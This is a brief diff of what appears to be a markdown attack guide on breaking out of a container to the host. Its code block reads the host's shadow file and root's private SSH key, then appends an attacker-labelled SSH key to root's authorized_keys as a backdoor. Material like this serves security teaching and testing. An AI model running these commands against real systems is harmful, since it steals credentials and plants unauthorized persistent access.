@@ -358,7 +358,8 @@ cat /host/etc/shadow
 cat /host/root/.ssh/id_rsa
 
 # Add backdoor SSH key to host
-echo "ssh-rsa AAAA..." >> /host/root/.ssh/authorized_keys
+ATTACKER_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMhR8Vz3QK6Yp4l3qz5v0h7XG2nU3tJkPbTk9WmVfRwE attacker@kali"
+echo "$ATTACKER_KEY" >> /host/root/.ssh/authorized_keys
 ```
 
 ---
